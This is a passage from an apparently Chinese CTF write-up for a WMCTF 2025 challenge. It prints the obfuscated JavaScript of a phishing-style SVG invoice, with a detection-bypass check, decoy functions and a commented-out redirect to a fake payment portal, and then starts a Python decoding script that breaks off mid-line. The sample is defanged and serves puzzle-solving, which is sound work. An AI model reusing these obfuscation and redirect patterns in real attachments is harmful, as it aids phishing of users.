polymorphicData.<span class="property">length</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> generateDynamicKey = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> timeComponent = (<span class="title class_">Date</span>.<span class="title function_">now</span>() % <span class="number">86400000</span>).<span class="title function_">toString</span>(<span class="number">36</span>); <span class="comment">// Daily changing component</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> envComponent = (globalSeed ^ <span class="number">0xDEADBEEF</span>).<span class="title function_">toString</span>(<span class="number">36</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> browserComponent = (navigator.<span class="property">userAgent</span>.<span class="property">length</span> * screen.<span class="property">colorDepth</span>).<span class="title function_">toString</span>(<span class="number">36</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> staticKey = <span class="string">&#x27;WMCTF_2025_SVG_ANALYSIS&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> staticKey;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> decryptionPipeline = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span> (!<span class="title function_">envValidation</span>()) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Environment validation failed&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">return</span> <span class="literal">null</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> dynamicKey = <span class="title function_">generateDynamicKey</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> realDataIndices = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]; <span class="comment">// Skip decoy data</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> encryptedParts = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; realDataIndices.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> idx = realDataIndices[i];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span> (idx &lt; polymorphicData.<span class="property">length</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              encryptedParts.<span class="title function_">push</span>(polymorphicData[idx]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Found encrypted parts:&#x27;</span>, encryptedParts.<span class="property">length</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> stage1Results = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; encryptedParts.<span class="property">length</span>; j++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> part = encryptedParts[j];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">// Convert Unicode escape sequences to characters</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> decoded = part.<span class="title function_">replace</span>(<span class="regexp">/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]/g</span>, <span class="keyword">function</span>(<span class="params">match</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">var</span> charMap = &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2V&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;4p2P&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;4p2F&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;4p2g&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;4p2a&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2c&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;4oyI&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;4p2T&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;77iP&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2S&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2L&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2D&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;4p2O&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2M&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2d&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;77iO&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;4p2b&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4p2Z&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4oyL&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;77iM&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2J&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2B&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2R&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;4p2h&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4p2X&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2H&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4pyx&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4p2I&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2A&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2C&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2Y&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;4p2j&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;77iK&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2U&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2K&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2N&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2E&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;4oyM&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;77iL&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;4py9&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;77iN&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2W&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2Q&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2G&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4py8&#x27;</span>: <span class="string">&#x27;!&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4py7&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py6&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py5&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py4&#x27;</span>: <span class="string">&#x27;!&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">return</span> charMap[match] || <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            stage1Results.<span class="title function_">push</span>(decoded);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> combined = stage1Results.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Stage 1 result:&#x27;</span>, combined);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> finalResult = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; combined.<span class="property">length</span>; k++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> char = combined.<span class="title function_">charCodeAt</span>(k);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> keyChar = dynamicKey.<span class="title function_">charCodeAt</span>(k % dynamicKey.<span class="property">length</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> transformed = char ^ (keyChar % <span class="number">32</span>); <span class="comment">// Reduced XOR for readability</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            finalResult += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(transformed);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">return</span> finalResult;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125; <span class="keyword">catch</span> (error) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Decryption failed:&#x27;</span>, error.<span class="property">message</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">return</span> <span class="literal">null</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> mathematicalObfuscation = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> phi = <span class="number">1.618033988749895</span>; <span class="comment">// Golden ratio</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> pi = <span class="number">3.141592653589793</span>;   <span class="comment">// Pi</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> e = <span class="number">2.718281828459045</span>;    <span class="comment">// Euler&#x27;s number</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> mathKey = <span class="title class_">Math</span>.<span class="title function_">floor</span>(phi * <span class="number">1000</span>) + <span class="title class_">Math</span>.<span class="title function_">floor</span>(pi * <span class="number">1000</span>) + <span class="title class_">Math</span>.<span class="title function_">floor</span>(e * <span class="number">1000</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">mathSegments</span> = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(mathKey % <span class="number">256</span>) + segments[<span class="number">0</span>]),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">2</span>) % <span class="number">256</span>) + segments[<span class="number">1</span>]),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">3</span>) % <span class="number">256</span>) + segments[<span class="number">2</span>]),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">4</span>) % <span class="number">256</span>) + segments[<span class="number">3</span>]),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">5</span>) % <span class="number">256</span>) + segments[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> mathKey;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> mathKey = <span class="title function_">mathematicalObfuscation</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">if</span> (detectionBypass &amp;&amp; !jXKuzdDMGk &amp;&amp; <span class="title function_">verification</span>()) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="title function_">constructPayload</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">extractFlag</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">hiddenData</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">var</span> encoded = <span class="title function_">atob</span>(<span class="variable language_">window</span>.<span class="property">hiddenData</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">var</span> key = <span class="string">&#x27;WMCTF2025&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">var</span> decoded = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; encoded.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                decoded += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                  encoded.<span class="title function_">charCodeAt</span>(i) ^ key.<span class="title function_">charCodeAt</span>(i % key.<span class="property">length</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Extracted flag:&#x27;</span>, decoded);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">return</span> decoded;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125; <span class="keyword">catch</span> (e) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Flag extraction failed&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;, <span class="number">1000</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Decoy functions to confuse analysis</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">function</span> <span class="title function_">generateFakeTraffic</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> fakeUrls = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="string">&#x27;https://api.example.com/data&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="string">&#x27;https://cdn.jsdelivr.net/npm/package&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="string">&#x27;https://fonts.googleapis.com/css&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// These would normally make requests but are disabled for CTF</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">function</span> <span class="title function_">createFakeElements</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Create invisible elements with misleading data</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> hiddenDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    hiddenDiv.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    hiddenDiv.<span class="property">innerHTML</span> = <span class="title function_">atob</span>(<span class="string">&#x27;RmFrZSBmbGFnOiBXTUNURntub3RfdGhlX3JlYWxfZmxhZ30=&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(hiddenDiv);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Initialize decoy functions</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">generateFakeTraffic</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">createFakeElements</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Add click handler for the invoice</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (detectionBypass &amp;&amp; !jXKuzdDMGk) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// This would normally redirect to phishing site</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// window.location.href = &#x27;https://fake-payment-portal.com&#x27;;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Invoice clicked - in real attack, this would redirect to phishing site&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这也太长了，直接丢给<code>ai</code>，<code>ChatGPT</code>和<code>Gemini</code>都分析出来了，<code>字符串映射</code>+<code>异或</code>，最后通过<strong>人工智能</strong>强大的文本分析能力，直接暴力地把<code>flag</code>给弄出来了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">polymorphicData = [</span><br><span class="line">    <span class="string">&#x27;V01DVEZbZmFrZV9mbGFnXQ==&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bm90X3RoZV9yZWFsX2ZsYWc=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ZGVjb3lfZGF0YQ==&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">charMap = &#123;</span><br><span class="line">    <span class="string">&#x27;4p2V&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;4p2P&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;4p2F&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;4p2g&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;4p2a&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2c&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;4oyI&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;4p2T&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;77iP&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2S&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2L&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2D&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;4p2O&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2M&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2d&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;77iO&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;4p2b&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4p2Z&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4oyL&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;77iM&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2J&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2B&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2R&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;4p2h&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4p2X&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2H&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4pyx&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4p2I&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2A&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2C&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2Y&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;4p2j&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;77iK&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2U&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2K&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4p2N&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2E&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;4oyM&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;77iL&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;4py9&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;77iN&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2W&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2Q&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span 